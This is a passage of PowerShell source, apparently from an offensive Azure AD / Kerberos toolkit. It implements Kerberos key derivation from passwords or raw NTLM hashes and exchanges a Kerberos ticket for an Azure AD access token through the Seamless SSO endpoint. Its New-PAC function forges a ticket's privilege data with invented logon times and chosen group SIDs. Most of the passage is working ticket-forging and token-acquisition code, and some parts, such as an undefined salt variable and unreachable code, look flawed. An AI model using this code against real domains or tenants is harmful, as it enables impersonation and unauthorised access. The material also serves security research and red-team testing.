    Param(
        [Parameter(Mandatory=$True)]
        [String]$Text,
        [byte]$Tag=0x1B
    )
    Process
    {
        $data = [system.text.encoding]::UTF8.GetBytes($Text)
        $output = @($Tag)
        $output += Get-DERLengthBytes($data)
        $output += $data
        return $output
    }
}

function Add-DERIA5String
{
    Param(
        [Parameter(Mandatory=$True)]
        [String]$Text,
        [byte]$Tag=0x16
    )
    Process
    {
        $data = [system.text.encoding]::ASCII.GetBytes($Text)
        $output = @($Tag)
        $output += Get-DERLengthBytes($data)
        $output += $data
        return $output
    }
}

function Add-DERInteger
{
    Param(
        [Parameter(Mandatory=$True)]
        [byte[]]$Data
    )
    Process
    {
        return Add-DERTag -Tag 0x02 -Data $Data
    }
}

function Add-DERBitString
{
    Param(
        [Parameter(Mandatory=$True)]
        [byte[]]$Data
    )
    Process
    {
        return Add-DERTag -Tag 0x03 -Data $Data
    }
}

function Add-DEROctetString
{
    Param(
        [Parameter(Mandatory=$True)]
        [byte[]]$Data
    )
    Process
    {
        return Add-DERTag -Tag 0x04 -Data $Data
    }
}

function Add-DERObjectIdentifier
{
    Param(
        [Parameter(Mandatory=$True)]
        [String]$ObjectIdentifier
    )
    Process
    {
        return Add-DERTag -Tag 0x06 -Data (Convert-OidToBytes -Oid $ObjectIdentifier)
    }
}

function Add-DERNull
{
    Process
    {
        return 0x05
    }
}

function Add-DERDate
{
    Param(
        [Parameter(Mandatory=$True)]
        [DateTime]$Date
    )
    Process
    {
        return Add-DERUtf8String -Text $Date.ToUniversalTime().ToString("yyyyMMddHHmmssZ") -Tag 0x18
    }
}

function Add-DERBoolean
{
    Param(
        [Parameter(Mandatory=$True)]
        [bool]$Value
    )
    Process
    {
        if($Value)
        {
            return @(0x01, 0xFF)
        }
        else
        {
            return @(0x01, 0x00)
        }
    }
}

# Gets an accesstoken using kerberos ticket
# Aug 25th 2019
function Get-AccessTokenWithKerberosTicket
{
    [cmdletbinding()]
    Param(
        [Parameter(Mandatory=$True)]
        [String]$KerberosTicket,
        [Parameter(Mandatory=$True)]
        [String]$Domain,
        [Parameter(Mandatory=$False)]
        [String]$Resource="https://graph.windows.net",
        [Parameter(Mandatory=$False)]
        [String]$ClientId="1b730954-1685-4b74-9bfd-dac224a7b894",
        [Parameter(Mandatory=$False)]
        [String]$Tenant="common"
    )
    Process
    {
        $requestId = (New-Guid).ToString()

        # Step 1: Get desktop sso token using kerberos ticket
        $url="https://autologon.microsoftazuread-sso.com/$domain/winauth/trust/2005/windowstransport?client-request-id=$requestId"
        $body=@"
        <?xml version='1.0' encoding='UTF-8'?>
            <s:Envelope xmlns:s='http://www.w3.org/2003/05/soap-envelope' xmlns:wsse='http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd' xmlns:saml='urn:oasis:names:tc:SAML:1.0:assertion' xmlns:wsp='http://schemas.xmlsoap.org/ws/2004/09/policy' xmlns:wsu='http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd' xmlns:wsa='http://www.w3.org/2005/08/addressing' xmlns:wssc='http://schemas.xmlsoap.org/ws/2005/02/sc' xmlns:wst='http://schemas.xmlsoap.org/ws/2005/02/trust'>
                <s:Header>
                    <wsa:Action s:mustUnderstand='1'>http://schemas.xmlsoap.org/ws/2005/02/trust/RST/Issue</wsa:Action>
                    <wsa:To s:mustUnderstand='1'>https://autologon.microsoftazuread-sso.com/$domain/winauth/trust/2005/windowstransport?client-request-id=$requestId</wsa:To>
                    <wsa:MessageID>urn:uuid:$((New-Guid).ToString())</wsa:MessageID>
                </s:Header>
                <s:Body>
                    <wst:RequestSecurityToken Id='RST0'>
                        <wst:RequestType>http://schemas.xmlsoap.org/ws/2005/02/trust/Issue</wst:RequestType>
                            <wsp:AppliesTo>
                                <wsa:EndpointReference>
                                    <wsa:Address>urn:federation:MicrosoftOnline</wsa:Address>
                                </wsa:EndpointReference>
                            </wsp:AppliesTo>
                            <wst:KeyType>http://schemas.xmlsoap.org/ws/2005/05/identity/NoProofKey</wst:KeyType>
                    </wst:RequestSecurityToken>
                </s:Body>
            </s:Envelope>
"@
        $headers = @{
            "SOAPAction"="http://schemas.xmlsoap.org/ws/2005/02/trust/RST/Issue"
            "Authorization" = "Negotiate $KerberosTicket"
        }
        try
        {
            $response = Invoke-WebRequest -UseBasicParsing -Uri $url -Method Post -Headers $headers -Body $body
        }
        catch
        {
            Write-Error $_.Exception
            return
        }

        [xml]$message = $response
        $dssoToken = $message.Envelope.Body.RequestSecurityTokenResponse.RequestedSecurityToken.Assertion.DesktopSsoToken


        # Step 2: get the access token using dssoToken
        $samlAssertion="<saml:Assertion xmlns:saml=`"urn:oasis:names:tc:SAML:1.0:assertion`"><DesktopSsoToken>$dssoToken</DesktopSsoToken></saml:Assertion>"

        $B64samlAssertion=[convert]::ToBase64String([text.encoding]::UTF8.GetBytes($samlAssertion))
        $body=@{
            "grant_type" = "urn:ietf:params:oauth:grant-type:saml1_1-bearer"
            "assertion" = $B64samlAssertion
            "client_id" = $ClientId
            "resource" = $Resource
            "tbidv2" = "" # Optional, see https://tools.ietf.org/html/draft-ietf-tokbind-protocol-19
            "scope" = "openid"
            "redirect_uri" = Get-AuthRedirectUrl -ClientId $ClientId -Resource $Resource # Originally: "ms-appx-web://Microsoft.AAD.BrokerPlugin/$clientId"
            "win_ver" = "10.0.17763.529"
            "windows_api_version" = "2.0"
            "msafed" = "0"
        }
        
        try
        {
            $response = Invoke-WebRequest -UseBasicParsing -Uri "https://login.microsoftonline.com/$Tenant/oauth2/token" -Method Post -Body $body
        }
        catch
        {
            if(![String]::IsNullOrEmpty($_.ErrorDetails.Message))
            {
                $error = $_.ErrorDetails.Message.ToString() | ConvertFrom-Json
                Write-Error $error.error_description
                return
            }
            else
            {
                Write-Error $_.exception
                return
            }
        }

        $token = $response.content | ConvertFrom-Json

        # Return
        return $token
    } 
}

# Calculate the server checksum of PAC
function Get-ServerSignature
{
    [cmdletbinding()]
    Param(
        [Parameter(Mandatory=$True)]
        [byte[]]$Key,
        [Parameter(Mandatory=$True)]
        [byte[]]$Data
    )
    Process
    {
        $hmacmd5 = [System.Security.Cryptography.HMACMD5]::new([byte[]]$key)
        $ksign = $hmacmd5.ComputeHash([system.text.Encoding]::ASCII.GetBytes("signaturekey")+@(0x00))

        $md5 = [System.Security.Cryptography.MD5]::Create()
        $tmp = $md5.ComputeHash(@(0x11, 0x00 , 0x00, 0x00)+$Data)

        $hmacmd5 = [System.Security.Cryptography.HMACMD5]::new([byte[]]$ksign)

        $signature = $hmacmd5.ComputeHash($tmp)

        return $signature
    }
}


function Get-NFold
{
    [cmdletbinding()]
    Param(
        [Parameter(Mandatory=$True)]
        [byte[]]$Data,
        [Parameter(Mandatory=$True)]
        [int]$Size
    )
    Process
    {
        $inBytesSize = $Data.Length
        $outBytesSize = $size

        $a = $outBytesSize
        $b = $inBytesSize

        while ($b -ne 0)
        {
            $c = $b
            $b = $a % $b
            $a = $c
        }

        $lcm = ($outBytesSize * $inBytesSize) / $a

        $outBytes = New-Object byte[] $outBytesSize

        $tmpByte = 0

        for ($i = $lcm - 1; $i -ge 0; $i--)
        {
            $msbit = (($inBytesSize -shl 3) - 1)

            $msbit += ((($inBytesSize -shl 3) + 13) * ([math]::Truncate($i / $inBytesSize)))
            $msbit += (($inBytesSize - ($i % $inBytesSize)) -shl 3)
            $msbit %= $inBytesSize -shl 3

            $rst = $Data[($inBytesSize - 1 - ($msbit -shr 3)) % $inBytesSize] -band 0xff
            $rst2 = $Data[($inBytesSize - ($msbit -shr 3)) % $inBytesSize] -band 0xff

            $msbit = ((($rst -shl 8) -bor ($rst2)) -shr (($msbit -band 7) + 1)) -band 0xff

            $tmpByte += $msbit
            $msbit = $outBytes[$i % $outBytesSize] -band 0xff
            $tmpByte += $msbit

            $outBytes[$i % $outBytesSize] = [byte]($tmpByte -band 0xff)

            $tmpByte = $tmpByte -shr 8
        }

        if ($tmpByte -ne 0)
        {
            for ($i = $outBytesSize - 1; $i -ge 0; $i--)
            {
                $tmpByte += $outBytes[$i] -band 0xff
                $outBytes[$i] = [byte]($tmpByte -band 0xff)

                $tmpByte = $tmpByte -shr 8
            }
        }

        return $outBytes
    }
}

# Encrypts/Decrypts the given plaintext using the given key
# Mar 29th 2021
function AES_CTS_Transform
{
    [cmdletbinding()]
    Param(
        [Parameter(Mandatory=$True)]
        [byte[]]$Data,
        [Parameter(Mandatory=$True)]
        [byte[]]$Key, 
        [Parameter(Mandatory=$False)]
        [byte[]]$InitialVector = [byte[]](0,0,0,0, 0,0,0,0, 0,0,0,0, 0,0,0,0),
        [Parameter(Mandatory=$True)]
        [ValidateSet('Encrypt','Decrypt')]
        [String]$Mode
    )
    Process
    {
        [System.Security.Cryptography.Aes]$AES = [System.Security.Cryptography.Aes]::Create()
        $AES.Padding = "None"
        $AES.Mode = "CBC"
        if($Mode -eq 'Encrypt')
        {
            $transformer = $AES.CreateEncryptor($Key,$InitialVector)
        }
        else
        {
            $transformer = $AES.CreateDecryptor($Key,$InitialVector)
        }

        # Create a memory stream and write the cipher text to it through CryptoStream
        $ms = New-Object System.IO.MemoryStream
        $cs = New-Object System.Security.Cryptography.CryptoStream($ms,$transformer,[System.Security.Cryptography.CryptoStreamMode]::Write)
        $cs.Write($data,0,$data.Count)
        $cs.Close()
        $cs.Dispose()

        $transformedData = $ms.ToArray()
        $ms.Close()
        $ms.Dispose()

        return $transformedData
    }
}

# Encrypts the given plaintext using the given key
# Mar 29th 2021
function AES_CTS_Encrypt
{
    [cmdletbinding()]
    Param(
        [Parameter(Mandatory=$True)]
        [byte[]]$PlainText,
        [Parameter(Mandatory=$True)]
        [byte[]]$Key, 
        [Parameter(Mandatory=$False)]
        [byte[]]$InitialVector = [byte[]](0,0,0,0, 0,0,0,0, 0,0,0,0, 0,0,0,0)
    )
    Process
    {
        $PadSize = 16 - ($PlainText.Count % 16)
        if($PlainText.Count -lt 16)
        {
            return $PlainText
        }

        if($PadSize -eq 16)
        {
            if($PlainText.Count -gt 16)
            {
                $InitialVector = [byte[]](0,0,0,0, 0,0,0,0, 0,0,0,0, 0,0,0,0)
            }

            $data = $PlainText

        }
        else
        {
            $data = [byte[]]@($PlainText + (New-Object byte[] $PadSize))
        }

        $encData = AES_CTS_Transform -Data $data -Key $Key -InitialVector $InitialVector -Mode Encrypt 

        if($PlainText.Count -ge 32)
        {
            $encData = SwapLastTwoBlocks -Data $encData
        }

        $result = New-Object byte[] $PlainText.Count

        [Array]::Copy($encData, 0, $result, 0, $PlainText.Count)

        return $result
    }
}

# Decrypts the given plaintext using the given key
# Mar 29th 2021
function AES_CTS_Decrypt
{
    [cmdletbinding()]
    Param(
        [Parameter(Mandatory=$True)]
        [byte[]]$CipherText,
        [Parameter(Mandatory=$True)]
        [byte[]]$Key, 
        [Parameter(Mandatory=$False)]
        [byte[]]$InitialVector = [byte[]](0,0,0,0, 0,0,0,0, 0,0,0,0, 0,0,0,0)
    )
    Process
    {
        $PadSize = 16 - ($CipherText.Count % 16)
        if($CipherText.Count -lt 16)
        {
            return $CipherText
        }

        if($PadSize -eq 16)
        {
            $data = $CipherText

            if($data.Count -ge 32)
            {
                $data = SwapLastTwoBlocks -Data $data
            }
            
            if($data.Count -gt 16)
            {
                $InitialVector = [byte[]](0,0,0,0, 0,0,0,0, 0,0,0,0, 0,0,0,0)
            }

            $decData = AES_CTS_Transform -Data $data -Key $Key -InitialVector $InitialVector -Mode Decrypt

            return $decData
        }
        else
        {
            $depadded = New-Object byte[] 16
            [Array]::Copy($CipherText,($CipherText.Count - 32 + $PadSize),$depadded,0,16)

            [byte[]]$dn = AES_CTS_Transform -Data $depadded -Key $Key -InitialVector $InitialVector -Mode Decrypt

            $data = New-Object byte[] ($CipherText.Count + $PadSize)
            [Array]::Copy($CipherText,0,$data,0,$CipherText.Count)
            [Array]::Copy($dn,($dn.Count - $PadSize),$data,$CipherText.Count,$PadSize)

            $data = SwapLastTwoBlocks -Data $data
            
            [byte[]]$decData =  AES_CTS_Transform -Data $data -Key $Key -InitialVector $InitialVector -Mode Decrypt

            $result = New-Object byte[] $CipherText.Count

            [Array]::Copy($decData,0,$result,0,$CipherText.Count)

            return $result

            $data = [byte[]]@($PlainText + (New-Object byte[] $PadSize))
        }

        [System.Security.Cryptography.Aes]$AES = [System.Security.Cryptography.Aes]::Create()
        $AES.Padding = "None"
        $AES.Mode = "CBC"
        $encryptor = $AES.CreateEncryptor($Key,$InitialVector)

        # Create a memory stream and write the cipher text to it through CryptoStream
        $ms = New-Object System.IO.MemoryStream
        $cs = New-Object System.Security.Cryptography.CryptoStream($ms,$encryptor,[System.Security.Cryptography.CryptoStreamMode]::Write)
        $cs.Write($data,0,$data.Count)
        $cs.Close()
        $cs.Dispose()

        $encData = $ms.ToArray()
        $ms.Close()
        $ms.Dispose()

        if($PlainText.Count -ge 32)
        {
            $PlainText = SwapLastTwoBlocks -Data $PlainText
        }

        $result = New-Object byte[] $PlainText.Count

        [Array]::Copy($encData, 0, $result, 0, $PlainText.Count)

        return $result
    }
}

# Swaps last two blocks of the given data. 
function SwapLastTwoBlocks
{
    [cmdletbinding()]
    Param(
        [Parameter(Mandatory=$True)]
        [byte[]]$Data
    )
    Process
    {
        for($i = 0 ; $i -lt 16; $i++)
        {
            [byte]$temp = $data[$i+$data.Count-32]

            $data[$i + $Data.Count -32] = $data[$i + $Data.Count -16]
            $data[$i + $Data.Count -16] = $temp
        }

        return $Data
    }
}

# Random-octect generation function
# https://tools.ietf.org/html/rfc3961
# Mar 28th 021
function DR
{
    [cmdletbinding()]
    Param(
        [Parameter(Mandatory=$True)]
        [byte[]]$Key,
        [Parameter(Mandatory=$True)]
        [byte[]]$Constant,
        [Parameter(Mandatory=$False)]
        [int]$KeySize = 32,
        [Parameter(Mandatory=$False)]
        [int]$BlockSize = 16
    )
    Process
    {
        if($KeySize -ne $Key.Count)
        {
            Throw "Invalid key size ($($Key.count) bytes), expected $KeySize bytes)"
        }
        $keyBytes = New-Object byte[] $key.Count

        if($Constant.Count -ne $BlockSize)
        {
            $Ki = Get-NFold -Data $Constant -Size $BlockSize
        }
        else
        {
            $ki = $Constant
        }

        $n = 0
        do
        {
            $ki = AES_CTS_Encrypt -PlainText $ki -Key $Key
            if(($n + $BlockSize) -ge $KeySize)
            {
                [Array]::Copy($Ki,0,$KeyBytes,$n,$KeySize-$n)
                break
            }

            [Array]::Copy($Ki,0,$KeyBytes,$n,$BlockSize)

            $n += $BlockSize
        }while($n -lt $KeySize)

        return $keyBytes
    }
}

# Key derivation function
# https://tools.ietf.org/html/rfc3961
# Mar 28th 021
function DK
{
    [cmdletbinding()]
    Param(
        [Parameter(Mandatory=$True)]
        [byte[]]$Key,

        [Parameter(ParameterSetName='KDF',Mandatory=$True)]
        [ValidateSet('Unknown','PaEncTs','Ticket','EncAsRepPart','TgsReqAuthDataSessionKey','TgsReqAuthDataSubSessionKey','PaTgsReqChecksum','PaTgsReqAuthenticator','EncTgsRepPartSessionKey','EncTgsRepPartSubSessionKey','AuthenticatorChecksum','ApReqAuthenticator','EncApRepPart','EncKrbPrivPart','EncKrbCredPart','KrbSafeChecksum','OtherEncrypted','PaForUserChecksum','KrbError','AdKdcIssuedChecksum','MandatoryTicketExtension','AuthDataTicketExtension','Seal','Sign','Sequence','AcceptorSeal','AcceptorSign','InitiatorSeal','InitiatorSign','PaServerReferralData','SamChecksum','SamEncTrackId','PaServerReferral','SamEncNonceSad','PaPkInitEx','AsReq','FastReqChecksum','FastEnc','FastRep','FastFinished','EncChallengeClient','EncChallengeKdc','DigestEncrypt','DigestOpaque','Krb5SignedPath','CanonicalizedPath','HslCookie')]
        [string]$Usage = "Ticket",

        [Parameter(ParameterSetName='KDF',Mandatory=$True)]
        [ValidateSet('Kc','Ke','Ki')]
        [string]$KeyDerivationMode = 'Ke',

        [Parameter(ParameterSetName='Constant',Mandatory=$True)]
        [byte[]]$Constant
    )
    Begin
    {
        $KeyDerivationModes = @{
            'Kc' = 0x99
            'Ke' = 0xAA
            'Ki' = 0x55
            }
        $KeyUsages = @{
            Unknown = 0
            PaEncTs = 1
            Ticket = 2
            EncAsRepPart = 3
            TgsReqAuthDataSessionKey = 4
            TgsReqAuthDataSubSessionKey = 5
            PaTgsReqChecksum = 6
            PaTgsReqAuthenticator = 7
            EncTgsRepPartSessionKey = 8
            EncTgsRepPartSubSessionKey = 9
            AuthenticatorChecksum = 10
            ApReqAuthenticator = 11
            EncApRepPart = 12
            EncKrbPrivPart = 13
            EncKrbCredPart = 14
            KrbSafeChecksum = 15
            OtherEncrypted = 16
            PaForUserChecksum = 17
            KrbError = 18
            AdKdcIssuedChecksum = 19

            MandatoryTicketExtension = 20
            AuthDataTicketExtension = 21
            Seal = 22
            Sign = 23
            Sequence = 24
            AcceptorSeal = 22
            AcceptorSign = 23
            InitiatorSeal = 24
            InitiatorSign = 25
            PaServerReferralData = 22
            SamChecksum = 25
            SamEncTrackId = 26
            PaServerReferral = 26
            SamEncNonceSad = 27
            PaPkInitEx = 44
            AsReq = 56
            FastReqChecksum = 50
            FastEnc = 51
            FastRep = 52
            FastFinished = 53
            EncChallengeClient = 54
            EncChallengeKdc = 55


            DigestEncrypt = -18
            DigestOpaque = -19
            Krb5SignedPath = -21
            CanonicalizedPath = -23
            HslCookie = -25
        }
    }
    Process
    {
        if($Constant)
        {
            # Generate a key
            return DR -Key $Key -KeySize ($Key.Count) -Constant $Constant 
        }
        else
        {
            # Generate a constant from Key Usage and Key Derivation Method
            $Constant = New-Object byte[] 5

            $bytes = [System.BitConverter]::GetBytes([int32]$KeyUsages[$Usage])
            [array]::Reverse($bytes)
            [Array]::Copy($bytes,$Constant,4)

            $constant[4] = [byte]$KeyDerivationModes[$KeyDerivationMode]

            return DK -Key $Key -Constant $constant
        }


    }
}


# Aligns sizes in PAC
Function Align-Size
{
    [cmdletbinding()]
    Param(
        [Parameter(Mandatory=$True)]
        [int]$Mask,
        [Parameter(Mandatory=$True)]
        [int]$Size
    )
    Process
    {
        $diff = $Size % $Mask
        if($diff -ne 0)
        {
            $Size += 8 - $diff
        }
        
        return $Size
        
    }
}

# Returns null-bytes used to align data fields in PAC
Function Get-AlignBytes
{
    [cmdletbinding()]
    Param(
        [Parameter(Mandatory=$True)]
        [int]$Mask,
        [Parameter(Mandatory=$True)]
        [int]$Size
    )
    Process
    {
        $diff = $Size % $Mask
        if($diff -ne 0)
        {
            return New-Object byte[] (8-$diff)
        }
        else
        {
            return
        }
        
    }
}


# Generates Kerberos encryption key
# Apr 1st 2021
function New-KerberosKey
{
    Param(
        [Parameter(Mandatory=$False)]
        [String]$Password,

        [Parameter(Mandatory=$False)]
        [String]$Hash,

        [Parameter(Mandatory=$False)]
        [ValidateSet('RC4','AES')]
        [String]$Crypto="RC4"
    )
    Process
    {
        if([string]::IsNullOrEmpty($Password) -and [string]::IsNullOrEmpty($Hash))
        {
            Throw "Unable to create Kerberos encryption key. Either Password or Hash must be provided"
        }

        if($Crypto -eq "RC4")
        {

            if([string]::IsNullOrEmpty($Password))
            {
                $key = Convert-HexToByteArray -HexString $Hash
            }
            else
            {
                $key = Get-MD4 -String $Password -AsByteArray
            }
        }
        elseif($Crypto -eq "AES")
        {

            if([string]::IsNullOrEmpty($Password))
            {
                $Key = Convert-HexToByteArray -HexString $Hash
            }
            else
            {
                $iterations =    4096
                $pwdBytes  = [text.encoding]::UTF8.GetBytes($Password)

                $pbkdf2 = New-Object System.Security.Cryptography.Rfc2898DeriveBytes([byte[]]$pwdBytes,$Salt,$iterations)

                $random = $pbkdf2.GetBytes(32)
                $Key = DK -Key $random -Constant ([text.encoding]::UTF8.GetBytes("kerberos"))
                    
            }
        }
        else
        {
            Throw "Unsupported crypto: $Crypto"
        }

        return $Key
    }
}

#============================================================
# Source: Kerberos.ps1
#============================================================

# Generates PAC for the kerberos ticket
# Aug 8th 2019
Function New-PAC
{
    
    [cmdletbinding()]
    Param(
        [Parameter(Mandatory=$True)]
        [String]$UserName,
        [Parameter(Mandatory=$False)]
        [String]$UserDisplayName,
        [Parameter(Mandatory=$False)]
        [String]$UserPrincipalName,
        [Parameter(Mandatory=$True)]
        [String]$ServerName,
        [Parameter(Mandatory=$True)]
        [String]$DomainName,
        [Parameter(Mandatory=$True)]
        [String]$DomainDNSName,
        [Parameter(Mandatory=$True)]
        [Byte[]]$Sid,
        [Parameter(Mandatory=$False)]
        [String]$Password,
        [Parameter(Mandatory=$False)]
        [String]$Hash,
        [Parameter(Mandatory=$True)]
        [DateTime]$AuthTime,
        [Parameter(Mandatory=$False)]
        [Int]$SequenceNumber=([System.Random]::new()).Next(),

        # https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/b10cfda1-f24f-441b-8f43-80cb93e786ec
        [Parameter(Mandatory=$False)]
        [Int]$UserAccountControl=0x00000080 # USER_WORKSTATION_TRUST_ACCOUNT #0x00000010 <# USER_NORMAL_ACCOUNT #> -bor 0X00000200 <# USER_DONT_EXPIRE_PASSWORD #> 
    )
    
    Process
    {
        # Set the timestamps
        $DeviceId =           $authTime                     # MUST be same than authTime
        $LogonTime =          $DeviceId.AddMinutes(-10)     # We've logged in 10 minutes ago :)
        $PwdLastChangeTime =  (Get-Date).AddDays(-10)       # We've changed our password 10 days ago,
        $PwdCanChangeTime =   $PwdLastChangeTime.AddDays(1) # so we could've changed it 9 days ago

        # Convert names to Unicode byte strings
        $bDomainName =        [system.text.encoding]::unicode.GetBytes(       $DomainName)
        $bUserName =          [system.text.encoding]::unicode.GetBytes(         $UserName) 
        $bUserDisplayName =   [system.text.encoding]::unicode.GetBytes(  $UserDisplayName)
        $bServerName =        [system.text.encoding]::unicode.GetBytes(       $ServerName)
        $bDomainDNSName =     [system.text.encoding]::unicode.GetBytes(    $DomainDNSName)
        $bUserPrincipalName = [system.text.encoding]::unicode.GetBytes($UserPrincipalName)

        # Extract the user and domain sids
        $bUserSid = $Sid[24..27]
        $bDomainSid = $Sid[0..23]
        $bDomainSid[1]=4 # Need to change from 5 to 4

        # Construct the PACs
        $LOGON_INFORMATION=[byte[]]@(    
            @(0x01)                   # Version = 0x01
            @(0x10)                   # Endianness (=little endian)
            @(0x08, 0x00)             # Length = 0x08
            @(0xCC, 0xCC, 0xCC, 0xCC) # Filler
            @(0x00, 0x00, 0x00, 0x00) # Length of the info buffer (placeholder)
            @(0x00, 0x00, 0x00, 0x00) # Zeros
            
            @(0x00, 0x00, 0x02, 0x00) # User info pointer

            [System.BitConverter]::GetBytes($LogonTime.ToFileTimeUtc())         # LogonTime 
            @(0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x7F)                   # LogOffTime 
            @(0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x7F)                   # KickOffTime 
            [System.BitConverter]::GetBytes($PwdLastChangeTime.ToFileTimeUtc()) # PwdLastChangeTime
            [System.BitConverter]::GetBytes($PwdCanChangeTime.ToFileTimeUtc())  # PwdCanChangeTime
            @(0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x7F)                   # PwdMustChangeTime
            # UserName
                [System.BitConverter]::GetBytes([int16]($bUserName.Length)) # Length
                [System.BitConverter]::GetBytes([int16]($bUserName.Length)) # Max length
                @(0x04, 0x00, 0x02, 0x00)                                   # Pointer
            # UserDisplayName
                [System.BitConverter]::GetBytes([int16]($bUserDisplayName.Length)) # Length
                [System.BitConverter]::GetBytes([int16]($bUserDisplayName.Length)) # Max Length
                @(0x08, 0x00, 0x02, 0x00)                                          # Pointer
            # LogonScript
                @(0x00, 0x00)             # Length
                @(0x00, 0x00)             # Max Length
                @(0x0C, 0x00, 0x02, 0x00) # Pointer
            # ProfilePath
                @(0x00, 0x00)             # Length
                @(0x00, 0x00)             # Max Length
                @(0x10, 0x00, 0x02, 0x00) # Pointer
            # HomeDirectory
                @(0x00, 0x00)             # Length
                @(0x00, 0x00)             # Max Length
                @(0x14, 0x00, 0x02, 0x00) # Pointer
            # HomeDrive    
                @(0x00, 0x00)             # Length
                @(0x00, 0x00)             # Max Length
                @(0x18, 0x00, 0x02, 0x00) # Pointer
            
            @(0x05, 0x00) # LogonCount -- just add something..
            @(0x00, 0x00) # BadPasswordCount

            
            $bUserSid                 # UserSid
            [System.BitConverter]::GetBytes([int32](513)) # GroupSid:
                                                          # https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups
                                                          # 0x0200 = 512 = Domain Admins
                                                          # 0x0201 = 513 = Domain Users
                                                          # 0x0202 = 514 = Domain Guests
                                                          # 0x0203 = 515 = Domain Computers
                                                          # 0x0204 = 516 = Domain Controllers
                                                          # 0x0207 = 519 = Enterprise Admins
                                                          # 0x020f = 527 = Key Admins
                                                          # 0x0220 = 544 = Local Admins
            @(0x02, 0x00, 0x00, 0x00) # GroupCount
            @(0x1C, 0x00, 0x02, 0x00) # GroupPointer
    
            # https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/69e86ccc-85e3-41b9-b514-7d969cd0ed73
            @(0x20, 0x00, 0x00, 0x00) # UserFlags
                                      # 0x 20 = ExtraSid is populated and contains additional SIDs
                                      # 0x200 = ResourceGroupIds field is populated.
    
            # UserSessionKey - used only for NTLM
            @(0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00)
    
            # ServerName
                [System.BitConverter]::GetBytes([int16]($bServerName.Length))   # Length
                [System.BitConverter]::GetBytes([int16]($bServerName.Length+2)) # MaxLength -- Why + 2 for the size??
                @(0x20, 0x00, 0x02, 0x00)                                       # Pointer
            # DomainName
                [System.BitConverter]::GetBytes([int16]($bDomainName.Length))   # Length
                [System.BitConverter]::GetBytes([int16]($bDomainName.Length+2)) # MaxLength
                @(0x24, 0x00, 0x02, 0x00)                                       # Pointer
            
            @(0x28, 0x00, 0x02, 0x00)                                   # DomainIDPointer
            @(0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00)           # Reserved = 8 x 0x00
            [System.BitConverter]::GetBytes([int32]$UserAccountControl) # UserAccountControl 
            @(0x00, 0x00, 0x00, 0x00)                                   # SubAuthStatus
            @(0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00)           # LastSuccessfullLogon
            @(0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00)           # LastFailedLogon
            @(0x00, 0x00, 0x00, 0x00)                                   # Failed Logon Count

            @(0x00, 0x00, 0x00, 0x00) # Reserved
            @(0x01, 0x00, 0x00, 0x00) # ExtraSidCount
            @(0x2C, 0x00, 0x02, 0x00) # ExtraSidPointer
                
            @(0x00, 0x00, 0x00, 0x00) # ResourceDomainIdPointer
            @(0x00, 0x00, 0x00, 0x00) # ResourceGroupCount
            @(0x00, 0x00, 0x00, 0x00) # ResourceGroupPointer
    
        # STRINGS
            # UserName
                [System.BitConverter]::GetBytes([int32]($bUserName.Length)/2) # Total = maxlength / 2
                @(0x00, 0x00, 0x00, 0x00)                                     # Unused
                [System.BitConverter]::GetBytes([int32]($bUserName.Length)/2) # used  = maxlength / 2
                $bUserName

            if($bUserName.Length/2 % 2 -gt 0){@(0x00, 0x00)} # Must be even sized
        
            # UserDisplayName
                [System.BitConverter]::GetBytes([int32]($bUserDisplayName.Length/2)) # Total
                @(0x00, 0x00, 0x00, 0x00)                                            # Unused
                [System.BitConverter]::GetBytes([int32]($bUserDisplayName.Length/2)) # Used
                if($bUserDisplayName.Length -gt 0){$bUserDisplayName}

            if($bUserDisplayName.Length/2 % 2 -gt 0){@(0x00, 0x00)} # Must be even sized
            
            @(0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00) # LogonScript
            @(0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00) # ProfilePath
            @(0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00) # HomeDirectory
            @(0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00) # HomeDrive
    
            # GroupSids     
                @(0x02, 0x00, 0x00, 0x00)                         # Count
                @(0x03, 0x02, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00) 
                @(0x0F, 0x02, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00) 

            # ServerName
                [System.BitConverter]::GetBytes([int32]($bServerName.Length)/2+1) # Total
                @(0x00, 0x00, 0x00, 0x00) # Unused
                [System.BitConverter]::GetBytes([int32]($bServerName.Length)/2)   # Length
                $bServerName

                if($bServerName.Length/2 % 2 -gt 0){@(0x00, 0x00)} # Must be even sized
             # DomainName
                [System.BitConverter]::GetBytes([int32]($bDomainName.Length)/2+1) # Total
                @(0x00, 0x00, 0x00, 0x00)                                         
                [System.BitConverter]::GetBytes([int32]($bDomainName.Length)/2)   # Length
                $bDomainName 
                if($bDomainName.Length/2 % 2 -gt 0){@(0x00, 0x00)} # Must be even sized

            # DomainSid
                @(0x04, 0x00, 0x00, 0x00) # Count
                $bDomainSid               # SidBytes
            # ExtraSid
                @(0x01, 0x00, 0x00, 0x00) # Count
                @(0x30, 0x00, 0x02, 0x00) # Pointer
                @(0x07, 0x00, 0x00, 0x00) # Attributes
                @(0x01, 0x00, 0x00, 0x00) # SidSize (count)
                @(0x01, 0x01, 0x00, 0x00, # Sid
                  0x00, 0x00, 0x00, 0x12, 
                  0x01, 0x00, 0x00, 0x00) 
        )
        # Set the correct size: Total size - the header
